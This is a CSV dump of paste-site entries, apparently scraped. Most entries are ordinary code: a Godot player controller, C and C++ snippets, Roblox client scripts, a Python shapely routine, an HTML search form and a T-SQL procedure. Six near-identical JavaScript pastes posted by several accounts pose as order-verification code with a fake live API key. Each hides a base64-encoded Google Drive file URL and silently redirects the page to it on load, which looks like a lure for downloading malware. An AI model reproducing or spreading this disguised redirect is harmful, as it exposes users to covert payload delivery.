id,title,username,language,date,content
6sZm0bmV,Third-Person Controller Player.gd Godot,Ragdev,GDScript,Friday 4th of April 2025 05:27:50 AM CDT,"extends CharacterBody3D
 
var Speed = 10.0
var JumpStrength = 10.0
var Gravity = 20.0
 
var Vel = Vector3.DOWN
var SnapVector = Vector3.DOWN
 
@onready var CamArm = $CamArm
@onready var Model = $Model
 
func _physics_process(delta):
	Movement(delta)
 
func _process(delta):
	CamArm.position = position
 
func Movement(delta):
	var MoveDir = Vector3.ZERO
	MoveDir.x = Input.get_action_strength(""Right"") - Input.get_action_strength(""Left"")
	MoveDir.z = Input.get_action_strength(""Back"") - Input.get_action_strength(""Forward"")
	MoveDir = MoveDir.rotated(Vector3.UP, CamArm.rotation.y).normalized()
	
	Vel.x = MoveDir.x * Speed
	Vel.z = MoveDir.z * Speed

	if is_on_floor():
		if Input.is_action_just_pressed(""Jump""):
			Vel.y = JumpStrength
		else:
			Vel.y = 0
	else:
		Vel.y -= Gravity * delta
	
	set_velocity(Vel)
	move_and_slide()
	Vel = get_real_velocity()
	
	if Vel.x != 0 or Vel.z != 0:
		var LookDirection = Vector2(Vel.z, Vel.x)
		Model.rotation.y = lerp_angle(Model.rotation.y, LookDirection.angle(), delta*5)

"
quf15Ji7,Market.js,iLoveToWatch,JavaScript,Friday 4th of April 2025 05:04:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/965/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
AbKsdJFu,Untitled,iLoveToWatch,JavaScript,Friday 4th of April 2025 04:49:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/574/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dCMhaKRB,Products.js,Xp_Isolation,JavaScript,Friday 4th of April 2025 04:33:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/371/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
D6cAA9mN,积木画 参考代码,Dmaxiya,C++,Friday 4th of April 2025 04:31:44 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int MOD = 1000000007;
const int maxn = 10000000 + 100;
int n;
int dp[maxn][3];

int add(int a, int b) {
    a += b;
    if (a >= MOD) {
        return a - MOD;
    }
    return a;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif  // ExRoc
    ios::sync_with_stdio(false);

    cin >> n;
    dp[1][0] = 1;
    dp[2][0] = 2;
    dp[2][1] = 1;
    dp[2][2] = 1;
    for (int i = 3; i <= n; ++i) {
        dp[i][0] = add(add(dp[i - 1][0], dp[i - 2][0]), add(dp[i - 1][1], dp[i - 1][2]));
        dp[i][1] = add(dp[i - 1][2], dp[i - 2][0]);
        dp[i][2] = add(dp[i - 1][1], dp[i - 2][0]);
    }
    cout << dp[n][0] << endl;

    return 0;
}
"
xikVt9LY,Order.js,Xp_Isolation,JavaScript,Friday 4th of April 2025 04:18:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/043/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LWv3iigR,Untitled,Derik_hacker,C,Friday 4th of April 2025 04:04:53 AM CDT,"#include ""bcd.h""


unsigned short bin2bcd(unsigned short val) {
    unsigned short bcd = 0;
    unsigned short posizione = 0;
    
    while (val > 0) {
        unsigned short cifra = val % 10; 
        bcd |= (cifra << (posizione * 4)); 
        val /= 10; 
        posizione++;
    }
    
    return bcd;
}"
8j2mVCCd,Untitled,Derik_hacker,C,Friday 4th of April 2025 04:03:30 AM CDT,"// bcd.h
#ifndef BCD_H
#define BCD_H

// Dichiarazione della funzione per convertire un numero in BCD
unsigned short bin2bcd(unsigned short val);

#endif // BCD_H"
DmEX4LSy,Market.js,Xp_Isolation,JavaScript,Friday 4th of April 2025 04:02:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/831/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Cs6RkSHS,ammo count,esuvii,Lua,Friday 4th of April 2025 03:36:41 AM CDT,!WA:2!nEv3Unssv4XJxjqT4NmzHi2LiKJfefwLnAswMHbKqG7e7eZ4Xo0UZoZkeYD5Ul7U2PDvfvvTtYGqRWCZCDEaqiFdcesa(cEaYtqllEcgK4bixXDlNt1UZFZmAPLC3vDQZ)158vLl1y5rlhTC0l3CkluW7ksvH0vVZCsQjwO6inmbx7mJe9PPAdn6jKtU7vty87QoTZGbAQ5GF29)8)7NdpZi8qqYdfmUzQBhF)opPv9g(ZdfIKiXX8UhZK0GZlMwpAin2fnDWeJInCivP)dRRwm8LRoHzOJAtgrljVxQM2BiLtvSWUXIJ7WdMFJPVsB)S7cv)kDAF6yk3COIoGDIx3dR3Q1eujPCMjyAieeIrnbtl)GbP8qmu3477ubEuutQIxHKQi9O8XBH(NdLh544mfvWXuIe8455QWNEcWovUPJZ))6XJdbL2PFUpFE(NAGWJPEwVEstiYR0LAMLBLEXSiQNHnIgnrlPjjnJ0oUMtL0(5mixcDnmF5deXCwqHOixZ0gIHMkJG32Gi3KbNJJP)6uMusJYNvKZHTjR8DnKWNRLB8feDHIuUbdVSQNC3TUKzssI106CPseHKKkKrJeDteMk)Kk7tnn5yeluNIKAYhi2OATfmunxQBAKBjfMP2fPVrvzc5uQQ6MxAGBjEZ9EdY2CVVybXTUfIIseIb2vknN5Cjkc3F52)kqGFJLi(G5BGGrLs38sIHXe(qA0Rr)d)qPsmur1ACZewUQDNV615icSpMHHvV0vkODD(WknGh8ZvK1290RlQnZEfdlc4BKaU2Qysi66R3CVRwfqpehaLR3iS(TxLJwu5GRTODyErDhuW3mkiVXvlx7O2n971S9hxVTFhVpP3UhuR9(13RIBT97D0H7vZV(LD5DthaD5Z6TBTU(966xZZ3lmMg(8SvDX(9(5BWtJO9bgXKQ6G6ToSXrT6N3n7oIW4NbPGCONvYQkx7nxWFn3E9SVY)m7Rwk7RfKTrq2ozF0L9pyjuWKIrLYwDUTFU(IgTS1CX1YE3GSVE2sz)GShK9iNzrm9NAn5yky(LxaVK7qTedzHYvV0LWc0chck1qhsEpIv2fs8ere9VENlaGyQIts(yaAfe8p9QIkRCW(py17C3Z00Kbwi7j(Do0R5(h4djknXGvt04Pqo2Joepk4hVs2AZHP9HQNHkOIj6LVVSIbqa7zFnqOgrm909gggzrS69cQseiFV3al5dC5co9SlxU63tl)UVbMJOHSrKKEsfmaJJYYLSCOJjaA)UIeH6NxQuPYVkNAra5IN(iFxlrSSe0gl8PSitSBny6f5wHDcnYs83np)8Rpj)yTsNBxhpVJn40SdNQeyVnI472Ut76zRPGKbYJC5CtyL(zlKEQLwO13kdpNTiM4g5snuSxu5xKsIGumPIV)cfKhofk4gel8j53(TKVdjAt8Cl9JfQONQiYjpDXG8azmK66NqdKV)BrfWVGZZdIEsm)nRZr(196zRjKFN3MHbumonzHTX4Rl7f03B(nZgxTQT9duCRMTR)FMpmrCCdfCeeLhE6HVZ93ANhKNxXfMHVk0WeCck88(PgJG3zmvbT1wn4hZcFohkRlBfPizDgojV6OCPd(P)XLSpLNIKBr5dnXFtllDHtLOLphhU3cm0YyZ8(fIh4IRfBzUfdm09S6WfYVuvC)ykBySzn3ebjA8zikqycrRdSd5acfWJbmb3SI3O0edZzoJdGW8qQ94zhx4q9WvY(mhpRGR3xZ4dtO9p4O2Wgaq3vd501Z(97yO8SpB8eS1msowg4jjkZPbt0HuorXebtTlruW0aV8p7GmM94a7LeQT4cC27Zf3xBXb6ZgjfkdE1aF4gugMeyoFdSHco6W(A2Hwuu74PklKaUDK5mJXZRiakRmdggsRBHWdqqne7fpY8BD335F7Dv7WoPSOzEpRrBZJUFi5XpuUmy8IRVbOxEqye4Dm2xUMhjrgtk7(cHyuj1j57UKPgr44CCTV8MxuLf5IhFl)gfxVeBu3JPjqnFu8SbOB31GnCLV4AHggcZ6wVv9D9B4v7j1VDsIXJ7dE)a2qhfJJ2JgRiwyy9d9GnrLXP)agNPJDCHpM1pls0lh9oaaY1ooV29xUfbHQccu6CZlQC9zahCwIZTVqYRRNT)OhU9J2(mcNLVD8WS)CJZPeng52c(Vu2AzpEEXnfSvFqebQlspb5ZUJ(4SFyJS)ML1S)E2)iBg89VCBktrHy5)hHjf584lEoLkRHLZgp0eXlR7)GT2(hT1dwE8)6z)V)
bpNn5ymS,CortaPoligono,sombruxo,Python,Friday 4th of April 2025 03:36:34 AM CDT,"from shapely.geometry import LineString, Polygon
# Installation --> pip install shapely
import logging

def intersects_polygon_path(polygon_mat, path_mat):
    polygon_points = [tuple(p) for p in polygon_mat]
    path_points = [tuple(p) for p in path_mat]
    logging.debug(f""polygon_points: {polygon_points}"")
    logging.debug(f""path_points: {path_points}"")

    polygon = Polygon(polygon_points)
    result = False
    i = 0
    while (not result) and (i < len(path_points) - 1):
        segment = LineString([path_points[i], path_points[i + 1]])
        result = polygon.intersects(segment)
        logging.debug(f""iteracion: {i}, result: {result}."")
        i += 1
    logging.info(f""result: {result}."")
    return result

# Define a rectangular polygon
polygon_mat = [
    [50.097986, 14.410436],
    [50.093511, 14.41595],
    [50.087722, 14.409767],
    [50.084028, 14.4086],
    [50.088344, 14.387347],
    [50.094278, 14.388269],
    [50.097986, 14.410436]
]

# Define a path (sequence of GPS points)
path_mat = [
    [50.105262981329595, 14.267437167464884],
    [50.105262981329595, 14.267437167464884],
    [50.074607754755135, 14.474670112031129],
    [50.0760853, 14.4747344]
]

logging.basicConfig(
    filename='salidaLog.log',
    level=logging.DEBUG,
    encoding='utf-8',
    format='[%(asctime)s] %(process)d-[%(threadName)s-%(thread)d] %(levelname)s %(module)s.%(funcName)s L:%(lineno)d: %(message)s'
)

print(""Intersects?"", intersects_polygon_path(polygon_mat, path_mat))
"
HyLaD9BN,ROBLOX Statistics Giver Script,AERQ1111,Lua,Friday 4th of April 2025 03:33:56 AM CDT,"-- I made this for fun, it gives you the statistics of how fast you're walking (SPS), your current walkspeed, and blablala etc

-- Create GUI
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild(""PlayerGui"")

local screenGui = Instance.new(""ScreenGui"")
screenGui.Parent = playerGui

local frame = Instance.new(""Frame"")
frame.Size = UDim2.new(0, 250, 0, 250) -- Adjusted height for JumpPower
frame.Position = UDim2.new(0.05, 0, 0.1, 0)
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.BackgroundTransparency = 0.2
frame.BorderSizePixel = 2
frame.Parent = screenGui

-- Title Section
local titleSection = Instance.new(""Frame"")
titleSection.Size = UDim2.new(1, 0, 0, 50)
titleSection.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
titleSection.BorderSizePixel = 2
titleSection.Parent = frame

local titleLabel = Instance.new(""TextLabel"")
titleLabel.Size = UDim2.new(1, 0, 0, 30)
titleLabel.Position = UDim2.new(0, 0, 0, 5)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = ""Character Statistics""
titleLabel.TextSize = 18
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
titleLabel.Parent = titleSection

-- Close Button (There WAS a button to hide the menu, but it's buggy)
local closeButton = Instance.new(""TextButton"")
closeButton.Size = UDim2.new(0, 25, 0, 25)
closeButton.Position = UDim2.new(1, -30, 0, 10)
closeButton.Text = ""X""
closeButton.TextColor3 = Color3.fromRGB(0, 0, 0) -- Changed to black
closeButton.Font = Enum.Font.SourceSansBold
closeButton.Parent = titleSection
closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- Stats Section
local statsSection = Instance.new(""Frame"")
statsSection.Size = UDim2.new(1, 0, 1, -50)
statsSection.Position = UDim2.new(0, 0, 0, 50)
statsSection.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
statsSection.BackgroundTransparency = 0.2
statsSection.BorderSizePixel = 2
statsSection.Parent = frame

-- Create Stat Labels
local statLabels = {}
local statNames = {
    ""Max Health"", ""Current Health"", ""WalkSpeed"", ""Speed (SPS)"", ""Regeneration Speed"", ""JumpPower""
}

for i, stat in ipairs(statNames) do
    local label = Instance.new(""TextLabel"")
    label.Size = UDim2.new(1, -10, 0, 20)
    label.Position = UDim2.new(0, 5, 0, 10 + (i - 1) * 25)
    label.BackgroundTransparency = 1
    label.Text = stat .. "": --""
    label.TextSize = 14
    label.Font = Enum.Font.SourceSans
    label.TextColor3 = Color3.fromRGB(0, 0, 0)
    label.Parent = statsSection
    statLabels[stat] = label
end

-- Make GUI Draggable (The title only)
local userInputService = game:GetService(""UserInputService"")
local dragging, dragStart, startPos

titleSection.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
    end
end)

titleSection.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

titleSection.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

-- Track Player Stats (Yourself)
local lastPosition = nil
game:GetService(""RunService"").RenderStepped:Connect(function()
    local character = player.Character
    if character and character:FindFirstChild(""Humanoid"") then
        local humanoid = character:FindFirstChild(""Humanoid"")
        statLabels[""Max Health""].Text = ""Max Health: "" .. math.floor(humanoid.MaxHealth)
        statLabels[""Current Health""].Text = ""Current Health: "" .. math.floor(humanoid.Health)
        statLabels[""WalkSpeed""].Text = ""WalkSpeed: "" .. humanoid.WalkSpeed
        statLabels[""JumpPower""].Text = ""JumpPower: "" .. humanoid.JumpPower
        statLabels[""Regeneration Speed""].Text = ""Regeneration Speed: "" .. humanoid.Health / humanoid.MaxHealth

        -- Speed calculation
        local root = character:FindFirstChild(""HumanoidRootPart"")
        if root then
            if lastPosition then
                local speed = (root.Position - lastPosition).magnitude / (1 / 60) -- Approx 60 FPS update rate
                statLabels[""Speed (SPS)""].Text = ""Speed (SPS): "" .. math.floor(speed)
            end
            lastPosition = root.Position
        end
    end
end)
-- the minecraft movie isn't that bad btw"
ctLNaLAd,ROBLOX Toggle Daytime Script (Adjustable),AERQ1111,Lua,Friday 4th of April 2025 03:27:10 AM CDT,"-- Upon executing, you must leave in order to disable the script
local lighting = game:GetService(""Lighting"")
local runService = game:GetService(""RunService"")
local userInput = game:GetService(""UserInputService"")

local isDayMode = false
local originalTime = lighting.TimeOfDay -- Stores the original game time
local connection -- Holds the loop event

-- Function to enable daytime (permanent)
local function enableDayMode()
    connection = runService.RenderStepped:Connect(function()
        lighting.TimeOfDay = ""12:00:00"" -- You can adjust the game time
        lighting.Brightness = 2
        lighting.OutdoorAmbient = Color3.fromRGB(200, 200, 200)
        lighting.Ambient = Color3.fromRGB(150, 150, 150)
        lighting.FogEnd = 100000
    end)
    print(""[TOGGLE] Day Mode: ON"")
end

-- Function to disable day time mode and restore the original time
local function disableDayMode()
    if connection then connection:Disconnect() end
    lighting.TimeOfDay = originalTime
    print(""[TOGGLE] Day Mode: OFF - Time restored to "" .. originalTime)
end

-- Toggle function
local function toggleDayMode()
    isDayMode = not isDayMode
    if isDayMode then
        enableDayMode()
    else
        disableDayMode()
    end
end

-- Listen for the ""T"" key to toggle
userInput.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.T then
        toggleDayMode()
    end
end)

print(""[INFO] Press 'T' to toggle Day Mode!"")

-- [Time Cycle's] (that you can use to adjust the script):
-- 🌅 Sunrise (Soft morning glow)
-- TimeOfDay = ""06:00:00""
-- Brightness = 1.5
-- OutdoorAmbient = Color3.fromRGB(170, 140, 100)

-- ☀️ Morning (Full daylight, bright & clear)
-- TimeOfDay = ""08:00:00""
-- Brightness = 2.0
-- OutdoorAmbient = Color3.fromRGB(200, 200, 200)

-- 🌤 Noon (Peak brightness, overhead sun)
-- TimeOfDay = ""12:00:00""
-- Brightness = 2.2
-- OutdoorAmbient = Color3.fromRGB(255, 255, 255)

-- 🌇 Afternoon (Sun slightly lower, warmer tone)
-- TimeOfDay = ""16:00:00""
-- Brightness = 1.8
-- OutdoorAmbient = Color3.fromRGB(220, 180, 140)

-- 🌆 Dusk (Golden-hour sunset)
-- TimeOfDay = ""18:30:00""
-- Brightness = 0.9
-- OutdoorAmbient = Color3.fromRGB(180, 120, 80)

-- 🌙 Night (Full night, dark blue sky)
-- TimeOfDay = ""20:00:00""
-- Brightness = 0.3
-- OutdoorAmbient = Color3.fromRGB(50, 50, 100)

-- 🌌 Midnight (Deep night, very dark)
-- TimeOfDay = ""00:00:00""
-- Brightness = 0.2
-- OutdoorAmbient = Color3.fromRGB(25, 25, 50)"
8XzTYUdR,ROBLOX Simple Rejoin Script,AERQ1111,Lua,Friday 4th of April 2025 03:22:51 AM CDT,"-- Script to rejoin the server you're currently in.
local teleportService = game:GetService(""TeleportService"")
local players = game:GetService(""Players"")
local player = players.LocalPlayer

local function rejoinServer()
    local serverId = game.JobId -- Gets the current server's ID
    teleportService:TeleportToPlaceInstance(game.PlaceId, serverId, player)
end

-- Example: Rejoin when pressing ""P""
local userInput = game:GetService(""UserInputService"")

userInput.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.P then -- Keybind to Rejoin (Original: ""P"")
        print(""[INFO] Rejoining same server..."")
        rejoinServer()
    end
end)

print(""[INFO] Press 'P' to rejoin the same server!"")"
BXmzLavu,Order.js,Xp_Isolation,JavaScript,Friday 4th of April 2025 03:16:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/840/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TtpmMp8S,Postnumre,LasseAhrendt,HTML,Friday 4th of April 2025 03:15:22 AM CDT,"<!DOCTYPE html>
<html lang=""da"">
<head>
<title>Postnumre i Danmark, Færøerne og Grønland</title>
<meta charset=""UTF-8"">
<meta name=""viewport"" content=""width=device-width, initial-scale=1"">
<link rel=""stylesheet"" href=""https://www.w3schools.com/w3css/4/w3.css"">
</head>
<body>

<div class=""w3-container w3-center"">
  <h1>Søg efter postnumre i Danmark, Færøerne og Grønland</h1>

  <p>Indtast et postnummer i feltet og tryk på søg-knappen.</p>

  <form class=""w3-container"" method=""get"">
    <p><input class=""w3-input w3-border w3-round-xxlarge"" type=""text"" id=""query"" name=""q""></p>
    <p><input class=""w3-btn w3-green w3-round"" type=""submit"" value=""Søg!""></p>
  </form>

  <div class=""w3-container w3-left w3-left-align"" id=""results"">

  </div>
</div>

</body>
</html>"
2R7N7tgt,as_en_getAvailableStatusesForInstance,Ruslan_Rayanov,T-SQL,Friday 4th of April 2025 02:49:54 AM CDT,"CREATE PROCEDURE [dbo].[as_en_getAvailableStatusesForInstance]
	@entityCode nvarchar(256),
	@instanceID int,	
	@username nvarchar(32)
AS
BEGIN
	declare @langID int = (select langID from as_users where username = @username)
	execute as_print  @langID
	select *, s.id StatusID ,
	(case isnull(buttonTitle,'') 
     when '' then isnull(ls.name, s.name )     
     else buttonTitle end 
    ) Name
	from as_en_availableStatuses avs 
    	inner join as_en_statuses s on s.id = avs.availableStatusID
    	left join [as_lang_statuses] ls on ls.itemID =s.id  and langID = @langID
	where 
		currentStatusID in (select statusID from as_en_entityInstances 
							where id = @instanceID and entityID in (select id from as_en_entities 
                                                                    where code = @entityCode) 
		) 
		and ( ( isnull(users, '') ='' and isnull(roles, '') ='' ) or dbo.sec_hasAccessByUsersRoles(@username, users, roles) = '1')
	order by avs.ord, s.ord

END"
